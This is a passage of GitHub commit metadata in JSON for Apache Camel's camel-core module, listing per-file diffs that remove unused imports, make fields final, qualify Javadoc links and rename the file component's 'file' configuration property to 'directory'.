                "filename": "camel-core/src/main/java/org/apache/camel/NoSuchHeaderException.java",
                "patch": "@@ -16,13 +16,11 @@\n  */\n package org.apache.camel;\n \n-import org.apache.camel.util.ExchangeHelper;\n-\n /**\n  * An exception caused when a mandatory header is not available on a message\n  * {@link Exchange}\n  *\n- * @see ExchangeHelper#getMandatoryHeader(Exchange, String, Class)\n+ * @see org.apache.camel.util.ExchangeHelper#getMandatoryHeader(Exchange, String, Class)\n  *\n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/NoSuchHeaderException.java",
                "sha": "fc58d8a212343ceb7e0240fd2072ba35320cf6b2",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/NoSuchPropertyException.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/NoSuchPropertyException.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/NoSuchPropertyException.java",
                "patch": "@@ -16,13 +16,11 @@\n  */\n package org.apache.camel;\n \n-import org.apache.camel.util.ExchangeHelper;\n-\n /**\n  * An exception caused when a mandatory property is not available on a message\n  * {@link Exchange}\n  * \n- * @see ExchangeHelper#getMandatoryProperty(Exchange, String, Class)\n+ * @see org.apache.camel.util.ExchangeHelper#getMandatoryProperty(Exchange, String, Class)\n  * \n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/NoSuchPropertyException.java",
                "sha": "c2d7693d9db29c2430e7dfdc751391518668751f",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/direct/DirectEndpoint.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/direct/DirectEndpoint.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/direct/DirectEndpoint.java",
                "patch": "@@ -20,7 +20,6 @@\n import java.util.concurrent.CopyOnWriteArrayList;\n \n import org.apache.camel.Consumer;\n-import org.apache.camel.Exchange;\n import org.apache.camel.Processor;\n import org.apache.camel.Producer;\n import org.apache.camel.impl.DefaultConsumer;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/direct/DirectEndpoint.java",
                "sha": "1f7dcd131f80e45008db18e681a6beef6e2833b6",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/FileComponent.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/FileComponent.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/FileComponent.java",
                "patch": "@@ -36,7 +36,7 @@\n         result.setFile(file);\n \n         GenericFileConfiguration config = new GenericFileConfiguration();\n-        config.setFile(file.getPath());\n+        config.setDirectory(file.getPath());\n         result.setConfiguration(config);\n \n         FileOperations operations = new FileOperations();",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/FileComponent.java",
                "sha": "2f3b7c3aebaf91789dd89a1bc7abae929b4c18d2",
                "status": "modified"
            },
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "changes": 19,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 9,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "patch": "@@ -28,11 +28,11 @@\n  */\n public class FileConsumer extends GenericFileConsumer<File> {\n \n-    private String rootPath;\n+    private String endpointPath;\n \n     public FileConsumer(GenericFileEndpoint<File> endpoint, Processor processor, GenericFileOperations<File> operations) {\n         super(endpoint, processor, operations);\n-        this.rootPath = endpoint.getConfiguration().getFile();\n+        this.endpointPath = endpoint.getConfiguration().getDirectory();\n     }\n \n     protected void pollDirectory(String fileName, List<GenericFile<File>> fileList) {\n@@ -61,7 +61,7 @@ protected void pollDirectory(String fileName, List<GenericFile<File>> fileList)\n         }\n         for (File file : files) {\n             // createa a generic file\n-            GenericFile<File> gf = asGenericFile(rootPath, file);\n+            GenericFile<File> gf = asGenericFile(endpointPath, file);\n \n             if (file.isDirectory()) {\n                 if (endpoint.isRecursive() && isValidFile(gf, true)) {\n@@ -88,7 +88,7 @@ protected void pollFile(String fileName, List<GenericFile<File>> fileList) {\n         }\n \n         // createa a generic file\n-        GenericFile<File> gf = asGenericFile(rootPath, file);\n+        GenericFile<File> gf = asGenericFile(endpointPath, file);\n \n         if (isValidFile(gf, false)) {\n             // matched file so add\n@@ -99,13 +99,14 @@ protected void pollFile(String fileName, List<GenericFile<File>> fileList) {\n     /**\n      * Creates a new GenericFile<File> based on the given file.\n      *\n+     * @param endpointPath the starting directory the endpoint was configued with\n      * @param file the source file\n      * @return wrapped as a GenericFile\n      */\n-    public static GenericFile<File> asGenericFile(String rootPath, File file) {\n+    public static GenericFile<File> asGenericFile(String endpointPath, File file) {\n         GenericFile<File> answer = new GenericFile<File>();\n         // use file specific binding\n-        answer.setEndpointPath(rootPath);\n+        answer.setEndpointPath(endpointPath);\n         answer.setBinding(new FileBinding());\n         answer.setFile(file);\n         answer.setFileLength(file.length());\n@@ -121,10 +122,10 @@ protected void pollFile(String fileName, List<GenericFile<File>> fileList) {\n         if (file.isAbsolute()) {\n             answer.setRelativeFileName(null);\n         } else {\n-            // skip root path\n             File path;\n-            if (file.getPath().startsWith(rootPath)) {\n-                path = new File(ObjectHelper.after(file.getPath(), rootPath + File.separator));\n+            if (file.getPath().startsWith(endpointPath)) {\n+                // skip duplicate endpoint path\n+                path = new File(ObjectHelper.after(file.getPath(), endpointPath + File.separator));\n             } else {\n                 path = new File(file.getPath());\n             }",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "sha": "6c00bc0dafeae6b5eb89dfd9c2c0533d05741737",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/FileEndpoint.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/FileEndpoint.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/FileEndpoint.java",
                "patch": "@@ -103,7 +103,7 @@ public File getFile() {\n     public void setFile(File file) {\n         this.file = file;\n         // update configuration as well\n-        getConfiguration().setFile(file.getPath());\n+        getConfiguration().setDirectory(file.getPath());\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/FileEndpoint.java",
                "sha": "f20d148609337eadbfc9f57adf3cdbd698220f7e",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "patch": "@@ -17,8 +17,8 @@\n package org.apache.camel.component.file;\n \n import java.io.File;\n-import java.io.Serializable;\n import java.io.IOException;\n+import java.io.Serializable;\n \n import org.apache.camel.util.FileUtil;\n import org.apache.camel.util.ObjectHelper;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFile.java",
                "sha": "cdd3abe0e7c9297e83fbb83b84f32f5f3b9b6580",
                "status": "modified"
            },
            {
                "additions": 15,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConfiguration.java",
                "changes": 25,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConfiguration.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 10,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/GenericFileConfiguration.java",
                "patch": "@@ -21,30 +21,35 @@\n \n public class GenericFileConfiguration {\n \n-    private String file;\n+    private String directory;\n \n     public boolean needToNormalize() {\n         return true;\n     }\n \n     public void configure(URI uri) {\n-        setFile(uri.getPath());\n+        setDirectory(uri.getPath());\n     }\n \n-    public String getFile() {\n-        return file;\n+    public String getDirectory() {\n+        return directory;\n     }\n \n-    public void setFile(String file) {\n-        this.file = needToNormalize()\n+    public void setDirectory(String directory) {\n+        this.directory = needToNormalize()\n             // must normalize path to cater for Windows and other OS\n-            ? FileUtil.normalizePath(file)\n-            // for the remote file we don't need to do that   \n-            : file;        \n+            ? FileUtil.normalizePath(directory)\n+            // for the remote directory we don't need to do that\n+            : directory;\n+\n+        // endpoint directory must not be null\n+        if (this.directory == null) {\n+            this.directory = \"\";\n+        }\n     }\n \n     public String toString() {\n-        return file;\n+        return directory;\n     }\n \n }",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConfiguration.java",
                "sha": "7ae2044df8285a6b87842f5167999a233e9630e6",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConsumer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConsumer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/GenericFileConsumer.java",
                "patch": "@@ -62,7 +62,7 @@ protected void poll() throws Exception {\n         // gather list of files to process\n         List<GenericFile<T>> files = new ArrayList<GenericFile<T>>();\n \n-        String name = endpoint.getConfiguration().getFile();\n+        String name = endpoint.getConfiguration().getDirectory();\n         pollDirectory(name, files);\n \n         // sort files using file comparator if provided",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFileConsumer.java",
                "sha": "fb5896585aa9e0bd024211cad697ad027cbf0442",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFileEndpoint.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/GenericFileEndpoint.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/GenericFileEndpoint.java",
                "patch": "@@ -411,12 +411,12 @@ public void setLocalWorkDirectory(String localWorkDirectory) {\n     public void configureMessage(GenericFile<T> file, Message message) {\n         message.setBody(file);\n \n-        // compute the name that was written, it should be relative to the endpoint configuraion\n+        // compute the name that was written\n         String name = file.isAbsolute() ? file.getAbsoluteFileName() : file.getRelativeFileName();\n \n-        if (name.startsWith(getConfiguration().getFile())) {\n-            // remove the file path configured on the endpoint for directory=true\n-            name = name.substring(getConfiguration().getFile().length());\n+        // skip leading endpoint configured directory\n+        if (name.startsWith(getConfiguration().getDirectory())) {\n+            name = ObjectHelper.after(name, getConfiguration().getDirectory());\n         }\n \n         if (name.startsWith(File.separator) || name.startsWith(\"/\")) {\n@@ -451,6 +451,7 @@ public void configureMessage(GenericFile<T> file, Message message) {\n         if (readLockTimeout > 0) {\n             params.put(\"readLockTimeout\", readLockTimeout);\n         }\n+\n         return params;\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFileEndpoint.java",
                "sha": "ad64138c6610ee282432f26b925699a64b081dde",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFileProducer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/GenericFileProducer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/GenericFileProducer.java",
                "patch": "@@ -172,7 +172,7 @@ protected String createFileName(Exchange exchange) {\n             name = expression.evaluate(exchange, String.class);\n         }\n \n-        String endpointFile = endpoint.getConfiguration().getFile();\n+        String endpointFile = endpoint.getConfiguration().getDirectory();\n         // Its a directory so we should use it as a base path for the filename\n         // If the path isn't empty, we need to add a trailing / if it isn't already there\n         String baseDir = \"\";",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/component/file/GenericFileProducer.java",
                "sha": "c032a8c18137b965f0e8b705d9f702a8cab0bee9",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/converter/stream/StreamCacheConverter.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/converter/stream/StreamCacheConverter.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 5,
                "filename": "camel-core/src/main/java/org/apache/camel/converter/stream/StreamCacheConverter.java",
                "patch": "@@ -16,10 +16,6 @@\n  */\n package org.apache.camel.converter.stream;\n \n-import java.io.ByteArrayInputStream;\n-import java.io.File;\n-import java.io.FileInputStream;\n-import java.io.FileNotFoundException;\n import java.io.IOException;\n import java.io.InputStream;\n import java.io.Reader;\n@@ -31,7 +27,6 @@\n \n import org.apache.camel.Converter;\n import org.apache.camel.Exchange;\n-import org.apache.camel.RuntimeCamelException;\n import org.apache.camel.StreamCache;\n import org.apache.camel.converter.jaxp.BytesSource;\n import org.apache.camel.converter.jaxp.StringSource;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/converter/stream/StreamCacheConverter.java",
                "sha": "d3e31ea17313eb62455bbf96fad5c8c8fb853838",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -85,7 +85,7 @@\n     private final Map<String, Endpoint> endpoints = new HashMap<String, Endpoint>();\n     private final Map<String, Component> components = new HashMap<String, Component>();\n     private List<Route> routes;\n-    private List<Service> servicesToClose = new ArrayList<Service>();\n+    private final List<Service> servicesToClose = new ArrayList<Service>();\n     private TypeConverter typeConverter;\n     private TypeConverterRegistry typeConverterRegistry;\n     private ExchangeConverter exchangeConverter;\n@@ -95,15 +95,15 @@\n     private LanguageResolver languageResolver = new DefaultLanguageResolver();\n     private Registry registry;\n     private LifecycleStrategy lifecycleStrategy;\n-    private List<RouteDefinition> routeDefinitions = new ArrayList<RouteDefinition>();\n+    private final List<RouteDefinition> routeDefinitions = new ArrayList<RouteDefinition>();\n     private List<InterceptStrategy> interceptStrategies = new ArrayList<InterceptStrategy>();\n     private Boolean trace;\n     private Long delay;\n     private ErrorHandlerBuilder errorHandlerBuilder;\n     private Map<String, DataFormatDefinition> dataFormats = new HashMap<String, DataFormatDefinition>();\n     private Map<String, String> properties = new HashMap<String, String>();\n     private Class<? extends FactoryFinder> factoryFinderClass = FactoryFinder.class;\n-    private Map<String, RouteService> routeServices = new HashMap<String, RouteService>();\n+    private final Map<String, RouteService> routeServices = new HashMap<String, RouteService>();\n     private ClassResolver classResolver;\n     private PackageScanClassResolver packageScanClassResolver;\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "45be4ba0c5425b873d59f4e4ea408e9ce60c869e",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultComponent.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultComponent.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 7,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultComponent.java",
                "patch": "@@ -27,8 +27,6 @@\n import org.apache.camel.Component;\n import org.apache.camel.Endpoint;\n import org.apache.camel.ResolveEndpointFailedException;\n-import org.apache.camel.spi.Injector;\n-import org.apache.camel.spi.Registry;\n import org.apache.camel.util.CamelContextHelper;\n import org.apache.camel.util.IntrospectionSupport;\n import org.apache.camel.util.ObjectHelper;\n@@ -276,39 +274,39 @@ protected boolean useIntrospectionOnEndpoint() {\n     }\n \n     /**\n-     * Creates a new instance of the given type using the {@link Injector} on the given\n+     * Creates a new instance of the given type using the {@link org.apache.camel.spi.Injector} on the given\n      * {@link CamelContext}\n      */\n     public  <T> T newInstance(Class<T> beanType) {\n         return getCamelContext().getInjector().newInstance(beanType);\n     }\n \n     /**\n-     * Look up the given named bean in the {@link Registry} on the\n+     * Look up the given named bean in the {@link org.apache.camel.spi.Registry} on the\n      * {@link CamelContext}\n      */\n     public Object lookup(String name) {\n         return getCamelContext().getRegistry().lookup(name);\n     }\n \n     /**\n-     * Look up the given named bean of the given type in the {@link Registry} on the\n+     * Look up the given named bean of the given type in the {@link org.apache.camel.spi.Registry} on the\n      * {@link CamelContext}\n      */\n     public <T> T lookup(String name, Class<T> beanType) {\n         return getCamelContext().getRegistry().lookup(name, beanType);\n     }\n \n     /**\n-     * Look up the given named bean in the {@link Registry} on the\n+     * Look up the given named bean in the {@link org.apache.camel.spi.Registry} on the\n      * {@link CamelContext} or throws exception if not found.\n      */\n     public Object mandatoryLookup(String name) {\n         return CamelContextHelper.mandatoryLookup(getCamelContext(), name);\n     }\n \n     /**\n-     * Look up the given named bean of the given type in the {@link Registry} on the\n+     * Look up the given named bean of the given type in the {@link org.apache.camel.spi.Registry} on the\n      * {@link CamelContext} or throws exception if not found.\n      */\n     public <T> T mandatoryLookup(String name, Class<T> beanType) {",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultComponent.java",
                "sha": "ac357a3086dabfa471a36a521ffe9ce797c6d1b2",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultConsumer.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultConsumer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultConsumer.java",
                "patch": "@@ -19,7 +19,6 @@\n import org.apache.camel.AsyncProcessor;\n import org.apache.camel.Consumer;\n import org.apache.camel.Endpoint;\n-import org.apache.camel.Exchange;\n import org.apache.camel.Processor;\n import org.apache.camel.impl.converter.AsyncProcessorTypeConverter;\n import org.apache.camel.spi.ExceptionHandler;\n@@ -31,8 +30,8 @@\n  * @version $Revision$\n  */\n public class DefaultConsumer extends ServiceSupport implements Consumer {\n-    private Endpoint endpoint;\n-    private Processor processor;\n+    private final Endpoint endpoint;\n+    private final Processor processor;\n     private AsyncProcessor asyncProcessor;\n     private ExceptionHandler exceptionHandler;\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultConsumer.java",
                "sha": "854fe7cf0fe642afa24739c73864e812e0b7919d",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultMessage.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultMessage.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultMessage.java",
                "patch": "@@ -23,10 +23,9 @@\n import javax.activation.DataHandler;\n \n import org.apache.camel.Exchange;\n-import org.apache.camel.Message;\n \n /**\n- * The default implementation of {@link Message}\n+ * The default implementation of {@link org.apache.camel.Message}\n  *\n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultMessage.java",
                "sha": "ebe8c38b7c2a9c43f470675942561ef2b7ffdacc",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultPollingEndpoint.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultPollingEndpoint.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultPollingEndpoint.java",
                "patch": "@@ -19,12 +19,10 @@\n import org.apache.camel.CamelContext;\n import org.apache.camel.Component;\n import org.apache.camel.Consumer;\n-import org.apache.camel.Exchange;\n-import org.apache.camel.PollingConsumer;\n import org.apache.camel.Processor;\n \n /**\n- * A base class for an endpoint which the default consumer mode is to use a {@link PollingConsumer}\n+ * A base class for an endpoint which the default consumer mode is to use a {@link org.apache.camel.PollingConsumer}\n  *\n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultPollingEndpoint.java",
                "sha": "130b86d57c7d0e104898f8ca277f879f7e41696b",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "patch": "@@ -47,11 +47,11 @@\n  * @version $Revision$\n  */\n public class DefaultRouteContext implements RouteContext {\n-    private RouteDefinition route;\n+    private final RouteDefinition route;\n     private FromDefinition from;\n-    private Collection<Route> routes;\n+    private final Collection<Route> routes;\n     private Endpoint endpoint;\n-    private List<Processor> eventDrivenProcessors = new ArrayList<Processor>();\n+    private final List<Processor> eventDrivenProcessors = new ArrayList<Processor>();\n     private Interceptor lastInterceptor;\n     private CamelContext camelContext;\n     private List<InterceptStrategy> interceptStrategies = new ArrayList<InterceptStrategy>();",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultRouteContext.java",
                "sha": "bf5377455c477b7e159463c47dd99611c5f377d5",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultScheduledPollConsumer.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultScheduledPollConsumer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultScheduledPollConsumer.java",
                "patch": "@@ -18,15 +18,15 @@\n \n import java.util.concurrent.ScheduledExecutorService;\n \n-import org.apache.camel.Consumer;\n import org.apache.camel.Endpoint;\n import org.apache.camel.Exchange;\n import org.apache.camel.Message;\n import org.apache.camel.PollingConsumer;\n import org.apache.camel.Processor;\n \n /**\n- * A default implementation of an event driven {@link Consumer} which uses the {@link PollingConsumer}\n+ * A default implementation of an event driven {@link org.apache.camel.Consumer} which uses the\n+ * {@link PollingConsumer}\n  *\n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DefaultScheduledPollConsumer.java",
                "sha": "9085f96a8c9a5bc8ab45d575d9f4d570eea1b2a1",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DelegateLifecycleStrategy.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DelegateLifecycleStrategy.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DelegateLifecycleStrategy.java",
                "patch": "@@ -20,7 +20,6 @@\n \n import org.apache.camel.CamelContext;\n import org.apache.camel.Endpoint;\n-import org.apache.camel.Exchange;\n import org.apache.camel.Route;\n import org.apache.camel.Service;\n import org.apache.camel.spi.LifecycleStrategy;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/DelegateLifecycleStrategy.java",
                "sha": "d0fc5f8b2ddaf80f03f845feae56927c9d1ef5d8",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/ExpressionAdapter.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/ExpressionAdapter.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/ExpressionAdapter.java",
                "patch": "@@ -17,12 +17,12 @@\n package org.apache.camel.impl;\n \n import org.apache.camel.Exchange;\n-import org.apache.camel.Expression;\n \n /**\n- * A helper class for developers wishing to implement an {@link Expression} using Java code with a minimum amount\n- * of code to write so that the developer only needs to implement one of the\n- * {@link #evaluate(Exchange)} or {@link #evaluate(org.apache.camel.Exchange, Class)} methods.\n+ * A helper class for developers wishing to implement an {@link org.apache.camel.Expression}\n+ * using Java code with a minimum amount of code to write so that the developer only needs\n+ * to implement one of the {@link #evaluate(Exchange)} or\n+ * {@link #evaluate(org.apache.camel.Exchange, Class)} methods.\n  *\n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/ExpressionAdapter.java",
                "sha": "dd6558d8352d99ccd67e3a0550f87a7930d1cc0a",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/ServiceSupport.java",
                "changes": 8,
